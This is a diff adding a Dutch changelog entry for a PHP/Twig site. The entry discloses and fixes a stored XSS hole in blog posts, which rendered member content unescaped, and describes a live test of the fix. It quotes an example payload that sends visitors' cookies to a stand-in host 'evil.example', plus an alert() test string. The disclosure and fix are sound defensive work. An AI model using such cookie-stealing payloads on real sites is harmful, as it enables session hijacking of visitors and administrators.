@@ -18,6 +18,56 @@ Versienummering volgt [Semantic Versioning](https://semver.org/lang/nl/).
 
 ---
 
+## [1.25.7] — 2026-09-29 — HOOG: stored XSS via blogposts — elk lid kon `<script>` naar elke bezoeker sturen
+
+Aanleiding: nog een bevinding uit de Security-deelaudit van de totale-codebase-audit (naast de
+al gefixte KRITIEK rol-priority-escalatie uit v1.25.5), onafhankelijk herverifieerd voordat
+'ie gefixt werd.
+
+### 🔴 Het lek
+
+`themes/{default,gaming-dark}/templates/blog/show.twig` rendert blogpost-inhoud met
+`{{ post.content|raw }}` — Twig's auto-escaping compleet uitgeschakeld voor dat veld.
+`BlogController::readPostInput()` doet geen enkele sanitization (alleen `trim()`). En de
+route ervoor, `POST /blog/{username}/nieuw` (`src/Core/Router.php`), is uitsluitend
+`$auth`-gated — **elk ingelogd lid**, niet een specifieke content-permissie.
+
+Vergelijk dat met News (`news.create`, standaard admin/moderator) en Pages (`pages.manage`,
+admin-only), die óók `|raw` gebruiken op hun `content`-veld — daar is dat een bewuste keuze
+(vertrouwde rollen mogen rich-HTML schrijven). Bij Blog ontbreekt precies die
+vertrouwensgrens: elk lid dat zich registreert kan direct een blogpost met
+`<script>document.location='https://evil.example/steal?c='+document.cookie</script>` plaatsen,
+die voor **elke bezoeker van die post — inclusief ingelogde beheerders** — gewoon uitvoert.
+Stored XSS, geen enkele interactie nodig behalve de pagina bekijken.
+
+### 🔧 Fix
+
+Nieuwe `nl2br`-Twig-filter in `ThemeManager::registerFunctions()`: doet zelf
+`htmlspecialchars()` vóór de `nl2br()`-conversie en is dus veilig ongeacht positie in een
+filter-keten (in tegenstelling tot Twig's eigen `escape|nl2br`, waar de volgorde er wél toe
+doet). `blog/show.twig` in beide thema's: `{{ post.content|raw }}` →
+`{{ post.content|nl2br }}`. Bewuste keuze voor "geëscapete platte tekst met regeleinden" i.p.v.
+een HTML-sanitizer/allowlist (bv. HTMLPurifier) — er is geen rich-text-editor voor blogposts
+(`edit.twig` gebruikt een plain `<textarea>`), dus content was nooit bedoeld als HTML.
+News/Pages blijven onveranderd op `|raw` — dat blijft terecht, gezien hun contentpermissies.
+
+### ✅ Live getest
+
+Volledige installatie doorlopen, een lid-account aangemaakt (alléén de standaard `member`-rol,
+geen enkele content-permissie), ingelogd en een blogpost geplaatst met
+`Hallo<script>alert(document.cookie)</script>wereld` + een regeleinde als inhoud:
+
+- Gerenderde pagina toont letterlijk
+  `Hallo&lt;script&gt;alert(document.cookie)&lt;/script&gt;wereld<br />` — het payload staat
+  er als platte, geëscapete tekst, geen uitvoerbare `<script>`-tag. De enige echte
+  `<script>`-tag op de pagina is de legitieme `/assets/js/blueprint.js`-include.
+- Regeleinde correct omgezet naar `<br />` — de opmaak die gebruikers via een plain textarea
+  intypen blijft dus behouden, alleen zonder XSS-risico.
+
+Testomgeving nadien volledig opgeruimd.
+
+---
+
 ## [1.25.6] — 2026-09-29 — "Maak de github compleet" — documentatie-audit opgevolgd
 
 Aanleiding: de Documentatie/GitHub-Completeness-deelaudit (onderdeel van de zes-koppige totale
